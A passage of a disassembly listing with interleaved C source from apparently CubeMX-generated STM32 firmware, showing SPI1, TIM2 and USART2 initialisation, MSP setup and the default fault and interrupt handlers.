 8000ed6:	4b1a      	ldr	r3, [pc, #104]	; (8000f40 <MX_SPI1_Init+0x74>)
 8000ed8:	f44f 7282 	mov.w	r2, #260	; 0x104
 8000edc:	605a      	str	r2, [r3, #4]
  hspi1.Init.Direction = SPI_DIRECTION_2LINES;
 8000ede:	4b18      	ldr	r3, [pc, #96]	; (8000f40 <MX_SPI1_Init+0x74>)
 8000ee0:	2200      	movs	r2, #0
 8000ee2:	609a      	str	r2, [r3, #8]
  hspi1.Init.DataSize = SPI_DATASIZE_8BIT;
 8000ee4:	4b16      	ldr	r3, [pc, #88]	; (8000f40 <MX_SPI1_Init+0x74>)
 8000ee6:	f44f 62e0 	mov.w	r2, #1792	; 0x700
 8000eea:	60da      	str	r2, [r3, #12]
  hspi1.Init.CLKPolarity = SPI_POLARITY_LOW;
 8000eec:	4b14      	ldr	r3, [pc, #80]	; (8000f40 <MX_SPI1_Init+0x74>)
 8000eee:	2200      	movs	r2, #0
 8000ef0:	611a      	str	r2, [r3, #16]
  hspi1.Init.CLKPhase = SPI_PHASE_1EDGE;
 8000ef2:	4b13      	ldr	r3, [pc, #76]	; (8000f40 <MX_SPI1_Init+0x74>)
 8000ef4:	2200      	movs	r2, #0
 8000ef6:	615a      	str	r2, [r3, #20]
  hspi1.Init.NSS = SPI_NSS_SOFT;
 8000ef8:	4b11      	ldr	r3, [pc, #68]	; (8000f40 <MX_SPI1_Init+0x74>)
 8000efa:	f44f 7200 	mov.w	r2, #512	; 0x200
 8000efe:	619a      	str	r2, [r3, #24]
  hspi1.Init.BaudRatePrescaler = SPI_BAUDRATEPRESCALER_64;
 8000f00:	4b0f      	ldr	r3, [pc, #60]	; (8000f40 <MX_SPI1_Init+0x74>)
 8000f02:	2228      	movs	r2, #40	; 0x28
 8000f04:	61da      	str	r2, [r3, #28]
  hspi1.Init.FirstBit = SPI_FIRSTBIT_MSB;
 8000f06:	4b0e      	ldr	r3, [pc, #56]	; (8000f40 <MX_SPI1_Init+0x74>)
 8000f08:	2200      	movs	r2, #0
 8000f0a:	621a      	str	r2, [r3, #32]
  hspi1.Init.TIMode = SPI_TIMODE_DISABLE;
 8000f0c:	4b0c      	ldr	r3, [pc, #48]	; (8000f40 <MX_SPI1_Init+0x74>)
 8000f0e:	2200      	movs	r2, #0
 8000f10:	625a      	str	r2, [r3, #36]	; 0x24
  hspi1.Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8000f12:	4b0b      	ldr	r3, [pc, #44]	; (8000f40 <MX_SPI1_Init+0x74>)
 8000f14:	2200      	movs	r2, #0
 8000f16:	629a      	str	r2, [r3, #40]	; 0x28
  hspi1.Init.CRCPolynomial = 7;
 8000f18:	4b09      	ldr	r3, [pc, #36]	; (8000f40 <MX_SPI1_Init+0x74>)
 8000f1a:	2207      	movs	r2, #7
 8000f1c:	62da      	str	r2, [r3, #44]	; 0x2c
  hspi1.Init.CRCLength = SPI_CRC_LENGTH_DATASIZE;
 8000f1e:	4b08      	ldr	r3, [pc, #32]	; (8000f40 <MX_SPI1_Init+0x74>)
 8000f20:	2200      	movs	r2, #0
 8000f22:	631a      	str	r2, [r3, #48]	; 0x30
  hspi1.Init.NSSPMode = SPI_NSS_PULSE_ENABLE;
 8000f24:	4b06      	ldr	r3, [pc, #24]	; (8000f40 <MX_SPI1_Init+0x74>)
 8000f26:	2208      	movs	r2, #8
 8000f28:	635a      	str	r2, [r3, #52]	; 0x34
  if (HAL_SPI_Init(&hspi1) != HAL_OK)
 8000f2a:	4805      	ldr	r0, [pc, #20]	; (8000f40 <MX_SPI1_Init+0x74>)
 8000f2c:	f003 ff14 	bl	8004d58 <HAL_SPI_Init>
 8000f30:	4603      	mov	r3, r0
 8000f32:	2b00      	cmp	r3, #0
 8000f34:	d001      	beq.n	8000f3a <MX_SPI1_Init+0x6e>
  {
    Error_Handler();
 8000f36:	f7ff ffc3 	bl	8000ec0 <Error_Handler>
  }
  /* USER CODE BEGIN SPI1_Init 2 */

  /* USER CODE END SPI1_Init 2 */

}
 8000f3a:	bf00      	nop
 8000f3c:	bd80      	pop	{r7, pc}
 8000f3e:	bf00      	nop
 8000f40:	20000280 	.word	0x20000280
 8000f44:	40013000 	.word	0x40013000

08000f48 <HAL_SPI_MspInit>:

void HAL_SPI_MspInit(SPI_HandleTypeDef* spiHandle)
{
 8000f48:	b580      	push	{r7, lr}
 8000f4a:	b08a      	sub	sp, #40	; 0x28
 8000f4c:	af00      	add	r7, sp, #0
 8000f4e:	6078      	str	r0, [r7, #4]

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 8000f50:	f107 0314 	add.w	r3, r7, #20
 8000f54:	2200      	movs	r2, #0
 8000f56:	601a      	str	r2, [r3, #0]
 8000f58:	605a      	str	r2, [r3, #4]
 8000f5a:	609a      	str	r2, [r3, #8]
 8000f5c:	60da      	str	r2, [r3, #12]
 8000f5e:	611a      	str	r2, [r3, #16]
  if(spiHandle->Instance==SPI1)
 8000f60:	687b      	ldr	r3, [r7, #4]
 8000f62:	681b      	ldr	r3, [r3, #0]
 8000f64:	4a17      	ldr	r2, [pc, #92]	; (8000fc4 <HAL_SPI_MspInit+0x7c>)
 8000f66:	4293      	cmp	r3, r2
 8000f68:	d128      	bne.n	8000fbc <HAL_SPI_MspInit+0x74>
  {
  /* USER CODE BEGIN SPI1_MspInit 0 */

  /* USER CODE END SPI1_MspInit 0 */
    /* SPI1 clock enable */
    __HAL_RCC_SPI1_CLK_ENABLE();
 8000f6a:	4b17      	ldr	r3, [pc, #92]	; (8000fc8 <HAL_SPI_MspInit+0x80>)
 8000f6c:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000f6e:	4a16      	ldr	r2, [pc, #88]	; (8000fc8 <HAL_SPI_MspInit+0x80>)
 8000f70:	f443 5380 	orr.w	r3, r3, #4096	; 0x1000
 8000f74:	6613      	str	r3, [r2, #96]	; 0x60
 8000f76:	4b14      	ldr	r3, [pc, #80]	; (8000fc8 <HAL_SPI_MspInit+0x80>)
 8000f78:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000f7a:	f403 5380 	and.w	r3, r3, #4096	; 0x1000
 8000f7e:	613b      	str	r3, [r7, #16]
 8000f80:	693b      	ldr	r3, [r7, #16]

    __HAL_RCC_GPIOA_CLK_ENABLE();
 8000f82:	4b11      	ldr	r3, [pc, #68]	; (8000fc8 <HAL_SPI_MspInit+0x80>)
 8000f84:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000f86:	4a10      	ldr	r2, [pc, #64]	; (8000fc8 <HAL_SPI_MspInit+0x80>)
 8000f88:	f043 0301 	orr.w	r3, r3, #1
 8000f8c:	64d3      	str	r3, [r2, #76]	; 0x4c
 8000f8e:	4b0e      	ldr	r3, [pc, #56]	; (8000fc8 <HAL_SPI_MspInit+0x80>)
 8000f90:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000f92:	f003 0301 	and.w	r3, r3, #1
 8000f96:	60fb      	str	r3, [r7, #12]
 8000f98:	68fb      	ldr	r3, [r7, #12]
    /**SPI1 GPIO Configuration
    PA1     ------> SPI1_SCK
    PA6     ------> SPI1_MISO
    PA7     ------> SPI1_MOSI
    */
    GPIO_InitStruct.Pin = GPIO_PIN_1|GPIO_PIN_6|GPIO_PIN_7;
 8000f9a:	23c2      	movs	r3, #194	; 0xc2
 8000f9c:	617b      	str	r3, [r7, #20]
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 8000f9e:	2302      	movs	r3, #2
 8000fa0:	61bb      	str	r3, [r7, #24]
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 8000fa2:	2300      	movs	r3, #0
 8000fa4:	61fb      	str	r3, [r7, #28]
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 8000fa6:	2303      	movs	r3, #3
 8000fa8:	623b      	str	r3, [r7, #32]
    GPIO_InitStruct.Alternate = GPIO_AF5_SPI1;
 8000faa:	2305      	movs	r3, #5
 8000fac:	627b      	str	r3, [r7, #36]	; 0x24
    HAL_GPIO_Init(GPIOA, &GPIO_InitStruct);
 8000fae:	f107 0314 	add.w	r3, r7, #20
 8000fb2:	4619      	mov	r1, r3
 8000fb4:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 8000fb8:	f000 fdd4 	bl	8001b64 <HAL_GPIO_Init>

  /* USER CODE BEGIN SPI1_MspInit 1 */

  /* USER CODE END SPI1_MspInit 1 */
  }
}
 8000fbc:	bf00      	nop
 8000fbe:	3728      	adds	r7, #40	; 0x28
 8000fc0:	46bd      	mov	sp, r7
 8000fc2:	bd80      	pop	{r7, pc}
 8000fc4:	40013000 	.word	0x40013000
 8000fc8:	40021000 	.word	0x40021000

08000fcc <HAL_MspInit>:
/* USER CODE END 0 */
/**
  * Initializes the Global MSP.
  */
void HAL_MspInit(void)
{
 8000fcc:	b480      	push	{r7}
 8000fce:	b083      	sub	sp, #12
 8000fd0:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN MspInit 0 */

  /* USER CODE END MspInit 0 */

  __HAL_RCC_SYSCFG_CLK_ENABLE();
 8000fd2:	4b0f      	ldr	r3, [pc, #60]	; (8001010 <HAL_MspInit+0x44>)
 8000fd4:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000fd6:	4a0e      	ldr	r2, [pc, #56]	; (8001010 <HAL_MspInit+0x44>)
 8000fd8:	f043 0301 	orr.w	r3, r3, #1
 8000fdc:	6613      	str	r3, [r2, #96]	; 0x60
 8000fde:	4b0c      	ldr	r3, [pc, #48]	; (8001010 <HAL_MspInit+0x44>)
 8000fe0:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000fe2:	f003 0301 	and.w	r3, r3, #1
 8000fe6:	607b      	str	r3, [r7, #4]
 8000fe8:	687b      	ldr	r3, [r7, #4]
  __HAL_RCC_PWR_CLK_ENABLE();
 8000fea:	4b09      	ldr	r3, [pc, #36]	; (8001010 <HAL_MspInit+0x44>)
 8000fec:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000fee:	4a08      	ldr	r2, [pc, #32]	; (8001010 <HAL_MspInit+0x44>)
 8000ff0:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 8000ff4:	6593      	str	r3, [r2, #88]	; 0x58
 8000ff6:	4b06      	ldr	r3, [pc, #24]	; (8001010 <HAL_MspInit+0x44>)
 8000ff8:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000ffa:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8000ffe:	603b      	str	r3, [r7, #0]
 8001000:	683b      	ldr	r3, [r7, #0]
  /* System interrupt init*/

  /* USER CODE BEGIN MspInit 1 */

  /* USER CODE END MspInit 1 */
}
 8001002:	bf00      	nop
 8001004:	370c      	adds	r7, #12
 8001006:	46bd      	mov	sp, r7
 8001008:	f85d 7b04 	ldr.w	r7, [sp], #4
 800100c:	4770      	bx	lr
 800100e:	bf00      	nop
 8001010:	40021000 	.word	0x40021000

08001014 <NMI_Handler>:
/******************************************************************************/
/**
  * @brief This function handles Non maskable interrupt.
  */
void NMI_Handler(void)
{
 8001014:	b480      	push	{r7}
 8001016:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN NonMaskableInt_IRQn 0 */

  /* USER CODE END NonMaskableInt_IRQn 0 */
  /* USER CODE BEGIN NonMaskableInt_IRQn 1 */
   while (1)
 8001018:	e7fe      	b.n	8001018 <NMI_Handler+0x4>

0800101a <HardFault_Handler>:

/**
  * @brief This function handles Hard fault interrupt.
  */
void HardFault_Handler(void)
{
 800101a:	b480      	push	{r7}
 800101c:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN HardFault_IRQn 0 */

  /* USER CODE END HardFault_IRQn 0 */
  while (1)
 800101e:	e7fe      	b.n	800101e <HardFault_Handler+0x4>

08001020 <MemManage_Handler>:

/**
  * @brief This function handles Memory management fault.
  */
void MemManage_Handler(void)
{
 8001020:	b480      	push	{r7}
 8001022:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN MemoryManagement_IRQn 0 */

  /* USER CODE END MemoryManagement_IRQn 0 */
  while (1)
 8001024:	e7fe      	b.n	8001024 <MemManage_Handler+0x4>

08001026 <BusFault_Handler>:

/**
  * @brief This function handles Prefetch fault, memory access fault.
  */
void BusFault_Handler(void)
{
 8001026:	b480      	push	{r7}
 8001028:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN BusFault_IRQn 0 */

  /* USER CODE END BusFault_IRQn 0 */
  while (1)
 800102a:	e7fe      	b.n	800102a <BusFault_Handler+0x4>

0800102c <UsageFault_Handler>:

/**
  * @brief This function handles Undefined instruction or illegal state.
  */
void UsageFault_Handler(void)
{
 800102c:	b480      	push	{r7}
 800102e:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN UsageFault_IRQn 0 */

  /* USER CODE END UsageFault_IRQn 0 */
  while (1)
 8001030:	e7fe      	b.n	8001030 <UsageFault_Handler+0x4>

08001032 <SVC_Handler>:

/**
  * @brief This function handles System service call via SWI instruction.
  */
void SVC_Handler(void)
{
 8001032:	b480      	push	{r7}
 8001034:	af00      	add	r7, sp, #0

  /* USER CODE END SVCall_IRQn 0 */
  /* USER CODE BEGIN SVCall_IRQn 1 */

  /* USER CODE END SVCall_IRQn 1 */
}
 8001036:	bf00      	nop
 8001038:	46bd      	mov	sp, r7
 800103a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800103e:	4770      	bx	lr

08001040 <DebugMon_Handler>:

/**
  * @brief This function handles Debug monitor.
  */
void DebugMon_Handler(void)
{
 8001040:	b480      	push	{r7}
 8001042:	af00      	add	r7, sp, #0

  /* USER CODE END DebugMonitor_IRQn 0 */
  /* USER CODE BEGIN DebugMonitor_IRQn 1 */

  /* USER CODE END DebugMonitor_IRQn 1 */
}
 8001044:	bf00      	nop
 8001046:	46bd      	mov	sp, r7
 8001048:	f85d 7b04 	ldr.w	r7, [sp], #4
 800104c:	4770      	bx	lr

0800104e <PendSV_Handler>:

/**
  * @brief This function handles Pendable request for system service.
  */
void PendSV_Handler(void)
{
 800104e:	b480      	push	{r7}
 8001050:	af00      	add	r7, sp, #0

  /* USER CODE END PendSV_IRQn 0 */
  /* USER CODE BEGIN PendSV_IRQn 1 */

  /* USER CODE END PendSV_IRQn 1 */
}
 8001052:	bf00      	nop
 8001054:	46bd      	mov	sp, r7
 8001056:	f85d 7b04 	ldr.w	r7, [sp], #4
 800105a:	4770      	bx	lr

0800105c <SysTick_Handler>:

/**
  * @brief This function handles System tick timer.
  */
void SysTick_Handler(void)
{
 800105c:	b580      	push	{r7, lr}
 800105e:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN SysTick_IRQn 0 */

  /* USER CODE END SysTick_IRQn 0 */
  HAL_IncTick();
 8001060:	f000 f9b2 	bl	80013c8 <HAL_IncTick>
  /* USER CODE BEGIN SysTick_IRQn 1 */

  /* USER CODE END SysTick_IRQn 1 */
}
 8001064:	bf00      	nop
 8001066:	bd80      	pop	{r7, pc}

08001068 <TIM2_IRQHandler>:

/**
  * @brief This function handles TIM2 global interrupt.
  */
void TIM2_IRQHandler(void)
{
 8001068:	b580      	push	{r7, lr}
 800106a:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN TIM2_IRQn 0 */

  /* USER CODE END TIM2_IRQn 0 */
  HAL_TIM_IRQHandler(&htim2);
 800106c:	4802      	ldr	r0, [pc, #8]	; (8001078 <TIM2_IRQHandler+0x10>)
 800106e:	f003 ffc1 	bl	8004ff4 <HAL_TIM_IRQHandler>
  /* USER CODE BEGIN TIM2_IRQn 1 */

  /* USER CODE END TIM2_IRQn 1 */
}
 8001072:	bf00      	nop
 8001074:	bd80      	pop	{r7, pc}
 8001076:	bf00      	nop
 8001078:	200002e4 	.word	0x200002e4

0800107c <USB_IRQHandler>:

/**
  * @brief This function handles USB event interrupt through EXTI line 17.
  */
void USB_IRQHandler(void)
{
 800107c:	b580      	push	{r7, lr}
 800107e:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_IRQn 0 */

  /* USER CODE END USB_IRQn 0 */
  HAL_PCD_IRQHandler(&hpcd_USB_FS);
 8001080:	4802      	ldr	r0, [pc, #8]	; (800108c <USB_IRQHandler+0x10>)
 8001082:	f001 f819 	bl	80020b8 <HAL_PCD_IRQHandler>
  /* USER CODE BEGIN USB_IRQn 1 */

  /* USER CODE END USB_IRQn 1 */
}
 8001086:	bf00      	nop
 8001088:	bd80      	pop	{r7, pc}
 800108a:	bf00      	nop
 800108c:	20000b7c 	.word	0x20000b7c

08001090 <SystemInit>:
  * @brief  Setup the microcontroller system.
  * @retval None
  */

void SystemInit(void)
{
 8001090:	b480      	push	{r7}
 8001092:	af00      	add	r7, sp, #0
  SCB->VTOR = VECT_TAB_BASE_ADDRESS | VECT_TAB_OFFSET;
#endif

  /* FPU settings ------------------------------------------------------------*/
#if (__FPU_PRESENT == 1) && (__FPU_USED == 1)
  SCB->CPACR |= ((3UL << 20U)|(3UL << 22U));  /* set CP10 and CP11 Full Access */
 8001094:	4b06      	ldr	r3, [pc, #24]	; (80010b0 <SystemInit+0x20>)
 8001096:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800109a:	4a05      	ldr	r2, [pc, #20]	; (80010b0 <SystemInit+0x20>)
 800109c:	f443 0370 	orr.w	r3, r3, #15728640	; 0xf00000
 80010a0:	f8c2 3088 	str.w	r3, [r2, #136]	; 0x88
#endif
}
 80010a4:	bf00      	nop
 80010a6:	46bd      	mov	sp, r7
 80010a8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80010ac:	4770      	bx	lr
 80010ae:	bf00      	nop
 80010b0:	e000ed00 	.word	0xe000ed00

080010b4 <MX_TIM2_Init>:

TIM_HandleTypeDef htim2;

/* TIM2 init function */
void MX_TIM2_Init(void)
{
 80010b4:	b580      	push	{r7, lr}
 80010b6:	b088      	sub	sp, #32
 80010b8:	af00      	add	r7, sp, #0

  /* USER CODE BEGIN TIM2_Init 0 */

  /* USER CODE END TIM2_Init 0 */

  TIM_ClockConfigTypeDef sClockSourceConfig = {0};
 80010ba:	f107 0310 	add.w	r3, r7, #16
 80010be:	2200      	movs	r2, #0
 80010c0:	601a      	str	r2, [r3, #0]
 80010c2:	605a      	str	r2, [r3, #4]
 80010c4:	609a      	str	r2, [r3, #8]
 80010c6:	60da      	str	r2, [r3, #12]
  TIM_MasterConfigTypeDef sMasterConfig = {0};
 80010c8:	1d3b      	adds	r3, r7, #4
 80010ca:	2200      	movs	r2, #0
 80010cc:	601a      	str	r2, [r3, #0]
 80010ce:	605a      	str	r2, [r3, #4]
 80010d0:	609a      	str	r2, [r3, #8]

  /* USER CODE BEGIN TIM2_Init 1 */

  /* USER CODE END TIM2_Init 1 */
  htim2.Instance = TIM2;
 80010d2:	4b1e      	ldr	r3, [pc, #120]	; (800114c <MX_TIM2_Init+0x98>)
 80010d4:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 80010d8:	601a      	str	r2, [r3, #0]
  htim2.Init.Prescaler = 7199;
 80010da:	4b1c      	ldr	r3, [pc, #112]	; (800114c <MX_TIM2_Init+0x98>)
 80010dc:	f641 421f 	movw	r2, #7199	; 0x1c1f
 80010e0:	605a      	str	r2, [r3, #4]
  htim2.Init.CounterMode = TIM_COUNTERMODE_UP;
 80010e2:	4b1a      	ldr	r3, [pc, #104]	; (800114c <MX_TIM2_Init+0x98>)
 80010e4:	2200      	movs	r2, #0
 80010e6:	609a      	str	r2, [r3, #8]
  htim2.Init.Period = 399;
 80010e8:	4b18      	ldr	r3, [pc, #96]	; (800114c <MX_TIM2_Init+0x98>)
 80010ea:	f240 128f 	movw	r2, #399	; 0x18f
 80010ee:	60da      	str	r2, [r3, #12]
  htim2.Init.ClockDivision = TIM_CLOCKDIVISION_DIV1;
 80010f0:	4b16      	ldr	r3, [pc, #88]	; (800114c <MX_TIM2_Init+0x98>)
 80010f2:	2200      	movs	r2, #0
 80010f4:	611a      	str	r2, [r3, #16]
  htim2.Init.AutoReloadPreload = TIM_AUTORELOAD_PRELOAD_DISABLE;
 80010f6:	4b15      	ldr	r3, [pc, #84]	; (800114c <MX_TIM2_Init+0x98>)
 80010f8:	2200      	movs	r2, #0
 80010fa:	619a      	str	r2, [r3, #24]
  if (HAL_TIM_Base_Init(&htim2) != HAL_OK)
 80010fc:	4813      	ldr	r0, [pc, #76]	; (800114c <MX_TIM2_Init+0x98>)
 80010fe:	f003 fece 	bl	8004e9e <HAL_TIM_Base_Init>
 8001102:	4603      	mov	r3, r0
 8001104:	2b00      	cmp	r3, #0
 8001106:	d001      	beq.n	800110c <MX_TIM2_Init+0x58>
  {
    Error_Handler();
 8001108:	f7ff feda 	bl	8000ec0 <Error_Handler>
  }
  sClockSourceConfig.ClockSource = TIM_CLOCKSOURCE_INTERNAL;
 800110c:	f44f 5380 	mov.w	r3, #4096	; 0x1000
 8001110:	613b      	str	r3, [r7, #16]
  if (HAL_TIM_ConfigClockSource(&htim2, &sClockSourceConfig) != HAL_OK)
 8001112:	f107 0310 	add.w	r3, r7, #16
 8001116:	4619      	mov	r1, r3
 8001118:	480c      	ldr	r0, [pc, #48]	; (800114c <MX_TIM2_Init+0x98>)
 800111a:	f004 f86d 	bl	80051f8 <HAL_TIM_ConfigClockSource>
 800111e:	4603      	mov	r3, r0
 8001120:	2b00      	cmp	r3, #0
 8001122:	d001      	beq.n	8001128 <MX_TIM2_Init+0x74>
  {
    Error_Handler();
 8001124:	f7ff fecc 	bl	8000ec0 <Error_Handler>
  }
  sMasterConfig.MasterOutputTrigger = TIM_TRGO_RESET;
 8001128:	2300      	movs	r3, #0
 800112a:	607b      	str	r3, [r7, #4]
  sMasterConfig.MasterSlaveMode = TIM_MASTERSLAVEMODE_DISABLE;
 800112c:	2300      	movs	r3, #0
 800112e:	60fb      	str	r3, [r7, #12]
  if (HAL_TIMEx_MasterConfigSynchronization(&htim2, &sMasterConfig) != HAL_OK)
 8001130:	1d3b      	adds	r3, r7, #4
 8001132:	4619      	mov	r1, r3
 8001134:	4805      	ldr	r0, [pc, #20]	; (800114c <MX_TIM2_Init+0x98>)
 8001136:	f004 fa4f 	bl	80055d8 <HAL_TIMEx_MasterConfigSynchronization>
 800113a:	4603      	mov	r3, r0
 800113c:	2b00      	cmp	r3, #0
 800113e:	d001      	beq.n	8001144 <MX_TIM2_Init+0x90>
  {
    Error_Handler();
 8001140:	f7ff febe 	bl	8000ec0 <Error_Handler>
  }
  /* USER CODE BEGIN TIM2_Init 2 */

  /* USER CODE END TIM2_Init 2 */

}
 8001144:	bf00      	nop
 8001146:	3720      	adds	r7, #32
 8001148:	46bd      	mov	sp, r7
 800114a:	bd80      	pop	{r7, pc}
 800114c:	200002e4 	.word	0x200002e4

08001150 <HAL_TIM_Base_MspInit>:

void HAL_TIM_Base_MspInit(TIM_HandleTypeDef* tim_baseHandle)
{
 8001150:	b580      	push	{r7, lr}
 8001152:	b084      	sub	sp, #16
 8001154:	af00      	add	r7, sp, #0
 8001156:	6078      	str	r0, [r7, #4]

  if(tim_baseHandle->Instance==TIM2)
 8001158:	687b      	ldr	r3, [r7, #4]
 800115a:	681b      	ldr	r3, [r3, #0]
 800115c:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8001160:	d113      	bne.n	800118a <HAL_TIM_Base_MspInit+0x3a>
  {
  /* USER CODE BEGIN TIM2_MspInit 0 */

  /* USER CODE END TIM2_MspInit 0 */
    /* TIM2 clock enable */
    __HAL_RCC_TIM2_CLK_ENABLE();
 8001162:	4b0c      	ldr	r3, [pc, #48]	; (8001194 <HAL_TIM_Base_MspInit+0x44>)
 8001164:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8001166:	4a0b      	ldr	r2, [pc, #44]	; (8001194 <HAL_TIM_Base_MspInit+0x44>)
 8001168:	f043 0301 	orr.w	r3, r3, #1
 800116c:	6593      	str	r3, [r2, #88]	; 0x58
 800116e:	4b09      	ldr	r3, [pc, #36]	; (8001194 <HAL_TIM_Base_MspInit+0x44>)
 8001170:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8001172:	f003 0301 	and.w	r3, r3, #1
 8001176:	60fb      	str	r3, [r7, #12]
 8001178:	68fb      	ldr	r3, [r7, #12]

    /* TIM2 interrupt Init */
    HAL_NVIC_SetPriority(TIM2_IRQn, 0, 0);
 800117a:	2200      	movs	r2, #0
 800117c:	2100      	movs	r1, #0
 800117e:	201c      	movs	r0, #28
 8001180:	f000 fa41 	bl	8001606 <HAL_NVIC_SetPriority>
    HAL_NVIC_EnableIRQ(TIM2_IRQn);
 8001184:	201c      	movs	r0, #28
 8001186:	f000 fa5a 	bl	800163e <HAL_NVIC_EnableIRQ>
  /* USER CODE BEGIN TIM2_MspInit 1 */

  /* USER CODE END TIM2_MspInit 1 */
  }
}
 800118a:	bf00      	nop
 800118c:	3710      	adds	r7, #16
 800118e:	46bd      	mov	sp, r7
 8001190:	bd80      	pop	{r7, pc}
 8001192:	bf00      	nop
 8001194:	40021000 	.word	0x40021000

08001198 <MX_USART2_UART_Init>:
UART_HandleTypeDef huart2;

/* USART2 init function */

void MX_USART2_UART_Init(void)
{
 8001198:	b580      	push	{r7, lr}
 800119a:	af00      	add	r7, sp, #0
  /* USER CODE END USART2_Init 0 */

  /* USER CODE BEGIN USART2_Init 1 */

  /* USER CODE END USART2_Init 1 */
  huart2.Instance = USART2;
 800119c:	4b14      	ldr	r3, [pc, #80]	; (80011f0 <MX_USART2_UART_Init+0x58>)
 800119e:	4a15      	ldr	r2, [pc, #84]	; (80011f4 <MX_USART2_UART_Init+0x5c>)
 80011a0:	601a      	str	r2, [r3, #0]
  huart2.Init.BaudRate = 115200;
 80011a2:	4b13      	ldr	r3, [pc, #76]	; (80011f0 <MX_USART2_UART_Init+0x58>)
 80011a4:	f44f 32e1 	mov.w	r2, #115200	; 0x1c200
 80011a8:	605a      	str	r2, [r3, #4]
  huart2.Init.WordLength = UART_WORDLENGTH_8B;
 80011aa:	4b11      	ldr	r3, [pc, #68]	; (80011f0 <MX_USART2_UART_Init+0x58>)
 80011ac:	2200      	movs	r2, #0
 80011ae:	609a      	str	r2, [r3, #8]
  huart2.Init.StopBits = UART_STOPBITS_1;
 80011b0:	4b0f      	ldr	r3, [pc, #60]	; (80011f0 <MX_USART2_UART_Init+0x58>)
 80011b2:	2200      	movs	r2, #0
 80011b4:	60da      	str	r2, [r3, #12]
  huart2.Init.Parity = UART_PARITY_NONE;
 80011b6:	4b0e      	ldr	r3, [pc, #56]	; (80011f0 <MX_USART2_UART_Init+0x58>)
 80011b8:	2200      	movs	r2, #0
 80011ba:	611a      	str	r2, [r3, #16]
  huart2.Init.Mode = UART_MODE_TX_RX;
 80011bc:	4b0c      	ldr	r3, [pc, #48]	; (80011f0 <MX_USART2_UART_Init+0x58>)
 80011be:	220c      	movs	r2, #12
 80011c0:	615a      	str	r2, [r3, #20]
  huart2.Init.HwFlowCtl = UART_HWCONTROL_NONE;
 80011c2:	4b0b      	ldr	r3, [pc, #44]	; (80011f0 <MX_USART2_UART_Init+0x58>)
 80011c4:	2200      	movs	r2, #0
 80011c6:	619a      	str	r2, [r3, #24]
  huart2.Init.OverSampling = UART_OVERSAMPLING_16;
 80011c8:	4b09      	ldr	r3, [pc, #36]	; (80011f0 <MX_USART2_UART_Init+0x58>)
 80011ca:	2200      	movs	r2, #0
 80011cc:	61da      	str	r2, [r3, #28]
  huart2.Init.OneBitSampling = UART_ONE_BIT_SAMPLE_DISABLE;
 80011ce:	4b08      	ldr	r3, [pc, #32]	; (80011f0 <MX_USART2_UART_Init+0x58>)
 80011d0:	2200      	movs	r2, #0
 80011d2:	621a      	str	r2, [r3, #32]
  huart2.AdvancedInit.AdvFeatureInit = UART_ADVFEATURE_NO_INIT;
 80011d4:	4b06      	ldr	r3, [pc, #24]	; (80011f0 <MX_USART2_UART_Init+0x58>)
 80011d6:	2200      	movs	r2, #0
 80011d8:	625a      	str	r2, [r3, #36]	; 0x24
  if (HAL_UART_Init(&huart2) != HAL_OK)
 80011da:	4805      	ldr	r0, [pc, #20]	; (80011f0 <MX_USART2_UART_Init+0x58>)
 80011dc:	f004 fa80 	bl	80056e0 <HAL_UART_Init>
 80011e0:	4603      	mov	r3, r0
 80011e2:	2b00      	cmp	r3, #0
 80011e4:	d001      	beq.n	80011ea <MX_USART2_UART_Init+0x52>
  {
    Error_Handler();
 80011e6:	f7ff fe6b 	bl	8000ec0 <Error_Handler>
  }
  /* USER CODE BEGIN USART2_Init 2 */

  /* USER CODE END USART2_Init 2 */

}
 80011ea:	bf00      	nop
 80011ec:	bd80      	pop	{r7, pc}
 80011ee:	bf00      	nop
 80011f0:	20000330 	.word	0x20000330
 80011f4:	40004400 	.word	0x40004400

080011f8 <HAL_UART_MspInit>:

void HAL_UART_MspInit(UART_HandleTypeDef* uartHandle)
{
 80011f8:	b580      	push	{r7, lr}
 80011fa:	b09e      	sub	sp, #120	; 0x78
 80011fc:	af00      	add	r7, sp, #0
 80011fe:	6078      	str	r0, [r7, #4]

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 8001200:	f107 0364 	add.w	r3, r7, #100	; 0x64
 8001204:	2200      	movs	r2, #0
 8001206:	601a      	str	r2, [r3, #0]
 8001208:	605a      	str	r2, [r3, #4]
 800120a:	609a      	str	r2, [r3, #8]
 800120c:	60da      	str	r2, [r3, #12]
 800120e:	611a      	str	r2, [r3, #16]
  RCC_PeriphCLKInitTypeDef PeriphClkInit = {0};
 8001210:	f107 0310 	add.w	r3, r7, #16
 8001214:	2254      	movs	r2, #84	; 0x54
 8001216:	2100      	movs	r1, #0
 8001218:	4618      	mov	r0, r3
